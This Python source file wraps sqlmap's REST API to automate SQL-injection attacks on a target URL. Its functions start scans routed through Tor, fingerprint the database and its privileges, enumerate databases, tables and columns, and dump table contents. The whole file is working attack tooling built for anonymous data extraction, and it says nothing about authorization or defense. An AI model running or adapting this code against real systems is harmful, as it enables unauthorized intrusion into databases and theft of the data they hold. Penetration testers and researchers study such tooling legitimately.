#!/usr/bin/env python3

import requests

sqlmap_url = "http://someserver.com:8775" #This is the server where you are running sqlmapapi.py from https://github.com/sqlmapproject/sqlmap/tarball/master
headers = {'Content-type': 'application/json'}

class Sqlmap(object):
	def sqlmap(target, test_param):
		req1 = requests.get("%s/task/new" % sqlmap_url)
		print(req1.json())
		d1 = req1.json()
		taskid = d1["taskid"]
		print(taskid)
		data = ('{"url": "%s", "timeSec": "10", "tor": true, "checkTor": false, "getDbs": true, \
				"getCurrentUser": true, "getCurrentDb": true, "isDba": true, "testParameter": "%s", \
				"getBanner": true, "batch": true}' % (target, test_param))

		r = requests.post(sqlmap_url + ("/scan/%s/start") % taskid, data=data, headers=headers)
		a = r.text
		return taskid

	def scan_results(taskid):
		req2 = requests.get(sqlmap_url + "/scan/%s/data" % taskid)
		d2 = req2.json()
		print(d2)
		results_dict = {}
		try:						
			db = d2["data"][0]["value"][0]["dbms"] #dbms type
			results_dict["dbms"] = db
		except:
			pass
		try:
			db_version = ' '.join(map(str,d2["data"][0]["value"][0]["dbms_version"])) #version of dbms
			results_dict["Version"] = db_version
		except:
			pass
		try:
			db_banner  = d2["data"][1]["value"] #Banner
			results_dict["Banner"] = db_banner
		except:
			pass
		try:
			injection_type = d2["data"][0]["value"][0]['data']['5']['title']
			results_dict["Type"] = injection_type
		except:
			pass
		try:
			isdba = d2["data"][4]["value"] # is dba
			results_dict["is DBA"] = isdba
		except:
			pass
		try:
			currentDB = d2["data"][3]["value"] # current db
			results_dict["CurrentDB"] = currentDB
		except:
			pass
		try:
			dbs = d2["data"][5]["value"]
			databases = ' '.join(dbs)
			results_dict["Databases"] = [databases]
		except:
			pass
		try:
			db_user = d2["data"][2]["value"] #dbuser
			results_dict["DB User"] = db_user
		except:
			pass
		return results_dict


	def get_tables(target, db):
		req1 = requests.get("%s/task/new" % sqlmap_url)
		print(req1.json())
		d1 = req1.json()
		taskid = d1["taskid"]
		print(taskid)
		data = ('{"url": "%s", "timeSec": "10", "tor": true, "checkTor": false, \
				"db": "%s", "getTables": true, "batch": true}' % (target, db))
		r = requests.post(sqlmap_url + "/scan/%s/start" % taskid, data=data, headers=headers)
		a = r.text
		return taskid

	def show_tables(taskid):
		req2 = requests.get(sqlmap_url + "/scan/%s/data" % taskid)
		d2 = req2.json()
		dbName = ' '.join(map(str,d2["data"][1]["value"]))
		tables = ' '.join(map(str,d2["data"][1]["value"][dbName]))
		r_tables = [tables]
		print(dbName)
		print(tables)
		return {dbName: r_tables}

	def get_columns(target, db, table):
		req1 = requests.get("%s/task/new" % sqlmap_url)
		print(req1.json())
		d1 = req1.json()
		taskid = d1["taskid"]
		print(taskid)
		data = ('{"url": "%s", "timeSec": "10", "tor": true, "checkTor": false, "db": "%s", \
				"tbl": "%s", "getColumns": true, "batch": true}' % (target, db, table))
		r = requests.post(sqlmap_url + "/scan/%s/start" % taskid, data=data, headers=headers)
		a = r.text
		return taskid

	def show_columns(taskid, tableName):
		req2 = requests.get(sqlmap_url + "/scan/%s/data" % taskid)
		d2 = req2.json()
		dbName = ' '.join(map(str,d2["data"][1]["value"]))
		columns = ' '.join(map(str,d2["data"][1]["value"][dbName]["%s" % tableName]))
		print(dbName)
		print(columns)
		return dbName, tableName, [columns]

	def dump(target, db, table, column):
		req1 = requests.get("%s/task/new" % sqlmap_url)
		print(req1.json())
		d1 = req1.json()
		taskid = d1["taskid"]
		print(taskid)
		data = ('{"url": "%s", "tor": true, "checkTor": false, "db": "%s", "tbl": "%s", \
				"col": "%s", "dumpTable": true, "batch": true}' % (target, db, table, column))
		r = requests.post(sqlmap_url + "/scan/%s/start" % taskid, data=data, headers=headers)
		return taskid

	def get_dump(taskid, column):
			req2 = requests.get(sqlmap_url + "/scan/%s/data" % taskid)
			d2 = req2.json()
			print(column)
			valuez = d2["data"][1]["value"][column]["values"]
			return valuez

	#returns the last message/notification messgage from sqlmap
	def log(taskid):
		req1 = requests.get(sqlmap_url + "/scan/%s/log" %  taskid)
		d1 = req1.json()
		log = d1["log"]
		last_message = []
		times = []
		levels = []
		for index in log:
			level = index["level"]
			message = index["message"]
			time = index["time"]
			last_message.append(message)
			times.append(time)
			levels.append(level)
		last_message = last_message[-1:]
		last_message = ' '.join(last_message) 
		print(last_message)
		print(time)
		print(message)
		return [time, level, last_message]
